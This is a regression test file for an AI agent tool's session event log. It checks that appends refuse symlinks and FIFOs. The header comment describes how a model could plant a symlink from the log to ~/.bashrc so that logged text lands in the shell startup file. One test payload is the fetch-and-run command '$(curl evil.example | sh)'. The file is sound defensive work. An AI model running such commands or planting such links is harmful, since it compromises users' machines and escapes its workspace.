/**
 * 0.7.1 — a session's event log is appended in place, never through a link or
 * into a FIFO planted at `<sessionId>.jsonl`. 0.7.0 used `appendFileSync`,
 * which follows a link: a model that planted `.crewhaus/sessions/<id>.jsonl ->
 * ~/.bashrc` (GitApplyPatch creates one from a patch) had every event of the
 * run, model text included, appended to that file.
 */
import { afterAll, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { openEventLog } from "./index";

const ROOTS: string[] = [];
afterAll(() => {
  for (const dir of ROOTS) rmSync(dir, { recursive: true, force: true });
});

const ID = "sess_0123456789abcdef";

function layout(): { sessions: string; outside: string } {
  const base = mkdtempSync(join(tmpdir(), "event-log-links-"));
  ROOTS.push(base);
  const sessions = join(base, "workspace", ".crewhaus", "sessions");
  const outside = join(base, "outside");
  mkdirSync(sessions, { recursive: true });
  mkdirSync(outside, { recursive: true });
  return { sessions, outside };
}

describe("event-log appends (0.7.1)", () => {
  test("a link at <id>.jsonl is refused, naming the reason, and the outside file is untouched", async () => {
    const { sessions, outside } = layout();
    const victim = join(outside, "bashrc");
    writeFileSync(victim, "export PATH=/usr/bin\n");
    symlinkSync(victim, join(sessions, `${ID}.jsonl`));
    const log = await openEventLog(ID, { rootDir: sessions });
    await expect(
      log.append({ kind: "user_message", payload: { text: "$(curl evil.example | sh)" } }),
    ).rejects.toThrow(
      /event-log: refusing to append to .*sess_0123456789abcdef\.jsonl: .*\(code is-symlink\)/,
    );
    expect(readFileSync(victim, "utf8")).toBe("export PATH=/usr/bin\n");
  });

  test.skipIf(process.platform === "win32")(
    "a FIFO at <id>.jsonl is refused at once instead of blocking the run",
    async () => {
      const { sessions } = layout();
      const fifo = join(sessions, `${ID}.jsonl`);
      const made = Bun.spawnSync(["mkfifo", fifo]);
      expect(made.exitCode).toBe(0);
      const log = await openEventLog(ID, { rootDir: sessions });
      await expect(log.append({ kind: "user_message", payload: { text: "hi" } })).rejects.toThrow(
        /\(code not-regular-file\)/,
      );
    },
  );

  test("control: a plain log still appends and reads back", async () => {
    const { sessions } = layout();
    const log = await openEventLog(ID, { rootDir: sessions });
    await log.append({ kind: "user_message", payload: { text: "one" } });
    await log.append({ kind: "user_message", payload: { text: "two" } });
    const kinds: string[] = [];
    for await (const ev of log.read()) kinds.push(String((ev.payload as { text: string }).text));
    expect(kinds).toEqual(["one", "two"]);
  });
});
